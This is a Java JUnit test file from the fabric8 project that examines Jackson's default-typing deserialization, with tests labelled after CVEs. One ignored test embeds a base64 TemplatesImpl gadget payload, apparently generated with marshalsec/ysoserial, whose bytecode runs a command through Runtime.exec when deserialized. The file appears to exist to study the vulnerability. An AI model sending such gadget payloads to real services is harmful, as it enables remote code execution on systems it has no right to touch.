/*
 *  Copyright 2005-2019 Red Hat, Inc.
 *
 *  Red Hat licenses this file to you under the Apache License, version
 *  2.0 (the "License"); you may not use this file except in compliance
 *  with the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
 *  implied.  See the License for the specific language governing
 *  permissions and limitations under the License.
 */
package io.fabric8.core;

import java.io.IOException;

import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.Ignore;
import org.junit.Test;

import static org.hamcrest.CoreMatchers.equalTo;
import static org.junit.Assert.assertThat;

public class JacksonTest {

    @Test
    public void justMarshallPerson() throws JsonProcessingException {
        ObjectMapper mapper = new ObjectMapper().enableDefaultTyping();
        System.out.println(mapper.writeValueAsString(new Person1()));
        System.out.println(mapper.writeValueAsString(new Person2()));
    }

    @Test
    public void justUnmarshall() throws IOException {
        ObjectMapper mapper = new ObjectMapper().enableDefaultTyping();
        Person2 p1 = mapper.readValue("{\"io.fabric8.core.JacksonTest$Person2\":{\"name\":\"name\",\"id\":3}}", Person2.class);
        assertThat(p1.name, equalTo("name"));
    }

    @Test
    public void justUnmarshallWithCVE1() throws IOException {
        ObjectMapper mapper = new ObjectMapper().disableDefaultTyping();
        Object o = mapper.readValue("[\"io.fabric8.core.JacksonTest$EventData2\", {}]", Object.class);
        System.out.println("Class: " + o.getClass());
    }

    @Test
    public void justUnmarshallWithCVE2() throws IOException {
        ObjectMapper mapper = new ObjectMapper().enableDefaultTyping();
        Object o = mapper.readValue("[\"io.fabric8.core.JacksonTest$Person3\", {}]", Object.class);
        System.out.println("Class: " + o.getClass());
    }

    @Test
    @Ignore
    public void justUnmarshallWithCVEInJRE() throws IOException {
        ObjectMapper mapper = new ObjectMapper().enableDefaultTyping();
        Object o = mapper.readValue("[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"yv66vgAAADQAPwoABAAlCQADACYHAD0HACkHACoBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAA90cmFuc2xldFZlcnNpb24BAAFJAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA2TG1hcnNoYWxzZWMvZ2FkZ2V0cy9UZW1wbGF0ZXNVdGlsJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABJUZW1wbGF0ZXNVdGlsLmphdmEMAA0ADgwACwAMBwAsAQA0bWFyc2hhbHNlYy9nYWRnZXRzL1RlbXBsYXRlc1V0aWwkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAIG1hcnNoYWxzZWMvZ2FkZ2V0cy9UZW1wbGF0ZXNVdGlsAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcALgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMADAAMQoALwAyAQAQamF2YS9sYW5nL1N0cmluZwcANAEAAmxzCAA2AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADgAOQoALwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjM0MDIwNDc4Mjg0NTYxAQAfTHlzb3NlcmlhbC9Qd25lcjM0MDIwNDc4Mjg0NTYxOwAhAAMABAABAAUAAgAaAAYABwABAAgAAAACAAkABAALAAwAAAAEAAEADQAOAAEADwAAADkAAgABAAAACyq3AAEqEGW1AAKxAAAAAgAQAAAACgACAAAAKAAEACsAEQAAAAwAAQAAAAsAEgA+AAAAAQAWABcAAgAPAAAAPwAAAAMAAAABsQAAAAIAEAAAAAYAAQAAAC4AEQAAACAAAwAAAAEAEgA+AAAAAAABABgAGQABAAAAAQAaABsAAgAcAAAABAABAB0AAQAWAB4AAgAPAAAASQAAAAQAAAABsQAAAAIAEAAAAAYAAQAAADIAEQAAACoABAAAAAEAEgA+AAAAAAABABgAGQABAAAAAQAfACAAAgAAAAEAIQAiAAMAHAAAAAQAAQAdAAgALQAOAAEADwAAACsABgACAAAAFqcAAwFMuAAzBL0ANVkDEjdTtgA7V7EAAAABADwAAAADAAEDAAIAIwAAAAIAJAAUAAAACgABAAMAJwATAAk=\"],\"transletName\":\"foo\",\"outputProperties\":{}}]\n", Object.class);
        System.out.println("Class: " + o.getClass());
    }

    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.PROPERTY, visible = true)
    public static class Person1 {

        @JsonProperty
        String name = "name";
        @JsonProperty
        Long id = 3L;
    }

    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_OBJECT)
    public static class Person2 {

        @JsonProperty
        String name = "name";
        @JsonProperty
        Long id = 3L;
    }

    public static class Person3 extends Person2 {
        public Person3() {
            System.out.println("Hello 1!");
        }
    }

}
